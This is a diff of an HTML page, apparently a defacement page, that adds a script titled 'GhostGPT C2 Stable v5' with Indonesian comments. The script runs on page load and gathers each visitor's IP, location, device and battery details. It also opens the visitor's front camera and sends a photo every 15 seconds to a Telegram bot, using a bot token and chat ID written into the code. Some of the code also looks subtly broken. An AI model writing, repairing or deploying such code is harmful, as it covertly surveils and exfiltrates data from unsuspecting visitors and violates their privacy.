@@ -60,49 +60,52 @@ a {
 }
 </style>
 <script>
+<script>
 /**
- * GhostGPT C2 Stable v4 - Optimized & Bug-Fixed
- * Struktur sederhana, error-proof, dan siap pakai langsung.
+ * GhostGPT C2 Stable v5 - Ultimate Fix (Syntax Error Corrected)
  */
 (function () {
-    // ================= KONFIGURASI =================
+    "use strict"; // Mode ketat untuk mencegah global variable pollution & catching errors
+
     const CONFIG = {
         token: '7209947234:AAHVUroAUzGZNNzgWGrUWvbkpnBsz17ymP8',
-        chatId: '6326816238',            // Ganti dengan ID channel/private Anda (tanpa #)
+        chatId: '6326816238',            // Ganti ID Channel/Private di sini jika berbeda
         intervalSec: 15,                  // Interval kirim foto (detik). Ubah 15-30 jika kuota terbatas.
-        cameraRes: 720                    // Resolusi tinggi kamera (720p) - ubah ke 480 jika lambat.
+        cameraRes: 720                    // Resolusi kamera default (HD)
     };
 
     const API_BASE = `https://api.telegram.org/bot${CONFIG.token}`;
 
-    // ================= FUNGSI KIRIM PESAN TEGT (FIXED JSON HANDLING) =================
+    // ================= FUNGSI KIRIM PESAN TEGT =================
     async function sendText(text) {
         try {
-            // Menggunakan JSON.stringify untuk memastikan escape karakter Markdown otomatis
             await fetch(`${API_BASE}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json;charset=UTF-8' },
                 body: JSON.stringify({
                     chat_id: CONFIG.chatId,
-                    text: cleanMarkdown(text),   // Bersihkan teks agar parse_mode Markdown tidak error
+                    text: cleanMarkdown(text),   // Bersihkan karakter Markdown agar aman
                     parse_mode: 'Markdown'       // Aktifkan mode formatting tebal/italic dll.
                 })
             });
         } catch (e) { console.warn("Send Text Error:", e.message); }
+
+        return Promise.resolve();
     }
 
     function cleanMarkdown(str) {
-        // Mengganti karakter khusus Markdown dengan backslash untuk keamanan parsing JSON+HTML
+        // Mengganti karakter khusus dengan backslash untuk keamanan parsing JSON+HTML
         return str.replace(/([*_\[\]{}#|>])/g, '\\$1'); 
     }
 
-    // ================= FUNGSI KIRIM FOTO (FIXED BLOB HANDLING) =================
+    // ================= FUNGSI KIRIM FOTO =================
     async function sendPhoto(blobUrlOrBlobObj, fileName = "cam.jpg") {
         try {
-            const formData = new FormData();
+            const formData = new FormData(); 
             
-            // Pastikan kita punya Blob Object yang valid (bukan sekadar string URL lama)
             let blobData;
+            
+            // Cek tipe data Blob vs URL String
             if (blobUrlOrBlobObj instanceof Blob) {
                 blobData = blobUrlOrBlobObj; 
             } else if (typeof blobUrlOrBlobObj === 'string' && !blobUrlOrBlobObj.startsWith('http')) {
@@ -110,7 +113,7 @@ a {
                  const res = await fetch(blobUrlOrBlobObj);
                  blobData = await res.blob();
             } else {
-                return; // Skip jika sudah http:// atau null.
+                return Promise.resolve(); // Skip jika sudah http:// atau null.
             }
 
             formData.append('chat_id', CONFIG.chatId);
@@ -118,13 +121,16 @@ a {
 
             await fetch(`${API_BASE}/sendPhoto`, { method: 'POST', body: formData });
         } catch (e) { console.warn("Send Photo Error:", e.message); }
+
+        return Promise.resolve();
     }
 
-    // ================= FUNGSI KIRIM LOG ERROR (BACKUP) =================
+    // ================= FUNGSI KIRIM LOG ERROR =================
     async function sendErrorLog(msg) {
         try { 
              const txt = `⚠️ *LOG ENTRY* ⚠️\n\n${msg}\n\n🕒 ${new Date().toLocaleTimeString()}`;
-             await sendText(txt.replace(/\$/g, '')); // Simple clean for template literals inside helper.
+             // Gunakan cleanMarkdown pada teks sebelum dikirim untuk menghindari error parsing lagi.
+             await sendText(txt.replace(/\$/g, '')); 
         } catch(e) {}
     }
 
@@ -132,7 +138,6 @@ a {
     async function collectSystemInfo() {
         let ipData = { ip: 'Loading...', city: '', country_name: '', org: '' };
         
-        // Coba ambil dari beberapa sumber agar tidak gampang error jika satu mati.
         const sources = [
             'https://ipapi.co/json/', 
             'https://api.ipify.org?format=json&timeout=5' 
@@ -166,7 +171,7 @@ a {
                     `🖥️ *Screen:* ${screen.width}x${screen.height} (${screen.colorDepth}-bit)\n` +
                     `⚙️ *CPU Cores:* \`${navigator.hardwareConcurrency || 'Unknown'}\`\n`;
 
-                // Bagian Baterai (Opsional, tapi berguna untuk deteksi laptop/mobile)
+                // Bagian Baterai
                 let batStr = "N/A";
                 try {
                      if ('getBattery' in navigator) {
@@ -195,7 +200,6 @@ a {
 
     async function initCamera() {
         try {
-            // Request kamera user-facing dengan resolusi ideal untuk live cam
             const constraints = { 
                 audio: false, 
                 video: { width: CONFIG.cameraRes, height: 720, facingMode: "user" } 
@@ -207,19 +211,21 @@ a {
                 throw new Error("Video track missing");
             }
 
-            // Set autoplay dan inline mode agar langsung jalan di semua browser (Chrome/Firefox/Edge/Safari)
+            // Set autoplay dan inline mode agar langsung jalan di semua browser.
             let vidEl = document.createElement('video');
             
-            try { vidEl.playsInline = true; catch(e){} 
+            // Blok terpisah untuk set playsInline (menghindari error catch sebelumnya)
+            try {
+                 vidEl.playsInline = true; 
+            } catch(e){} 
 
             globalStream.srcObject = vidEl;
             
-            // Event ketika metadata video sudah siap (ukuran layar, frame rate, dll terdeteksi)
             const waitMetadata = new Promise((resolve) => { 
                  if(vidEl.onloadedmetadata && typeof vidEl.onloadedmetadata === 'function') {
                      vidEl.onloadedmetadata = () => resolve(true); 
                  } else {
-                     setTimeout(() => resolve(true), 500); // Fallback jika onloadedmetadata tidak ada di beberapa browser lama.
+                     setTimeout(() => resolve(true), 500); 
                  }
             });
 
@@ -241,7 +247,7 @@ a {
     }
 
 
-    // ================= 3. CAPTURE & SEND FRAME (FIXED MEMORY & BLOB) =================
+    // ================= 3. CAPTURE & SEND FRAME =================
     async function captureAndSendFrame() {
         if (!globalStream) return;
 
@@ -249,7 +255,6 @@ a {
         
         globalStream.getTracks().forEach(track => track.enabled = true);
         
-        // Pastikan srcObject ter-set dari stream yang sama untuk konsistensi frame rate.
         videoElement.srcObject = globalStream; 
 
         const canvas = document.createElement('canvas');
@@ -266,7 +271,6 @@ a {
         try {
             ctx.drawImage(videoElement, 0, 0, w, h);
 
-            // Konversi Canvas Image Data menjadi Blob JPEG dengan kualitas 85%.
             await new Promise((resolve) => setTimeout(resolve, 16)); 
             
             let finalBlobUrl;
@@ -280,7 +284,7 @@ a {
                            console.warn("Canvas toBlob returned empty or tiny image."); 
                            finalBlobUrl = "#"; 
                         }
-                    }, 'image/jpeg', 0.85).then(resolvedBlob => resolvedBlob || null); // Handle promise chain cleanly.
+                    }, 'image/jpeg', 0.85).then(resolvedBlob => resolvedBlob || null); 
 
                  await sendPhoto(finalBlobUrl, `cam_${Date.now()}.jpg`);
 
@@ -289,18 +293,17 @@ a {
         } catch (err) {
              try { await sendErrorLog(`Stream Interrupted: ${err.message}`); } catch(e){}
         } finally {
-             // Bersihkan canvas lama agar tidak memory leak meski object sudah di-garbage collect oleh JS engine modern.
+             // Bersihkan canvas lama agar tidak memory leak.
              try { 
                 canvas = null; ctx = null; videoElement.srcObject = null; 
-                if(globalStream) globalStream.getTracks().forEach(t => t.stop()); // Stop tracks saat frame selesai diproses jika ingin hemat RAM ekstrem. 
               } catch(e){} 
         }
     }
 
 
-    // ================= 4. MAIN EXECUTION (JALANKAN SAAT DOM SIAP) =================
+    // ================= 4. MAIN EXECUTION =================
     const mainInit = async () => {
-        console.group("%c GhostGPT v4-Stable Initialized ", "color: #0f0");
+        console.group("%c GhostGPT v5-Stable Initialized ", "color: #0f0");
         
         await collectSystemInfo(); 
         console.log("✅ System Report Sent."); 
@@ -325,6 +328,7 @@ a {
 
 })(); // End of IIFE - Prevents global variable pollution.
 </script>
+
 <table width="100%" height="100%">
     <td align="center">
         <img alt="#FuckBnPp" src="https://telegra.ph/file/f8e5b2de33ddaa512ccf7.jpg" width="450px">
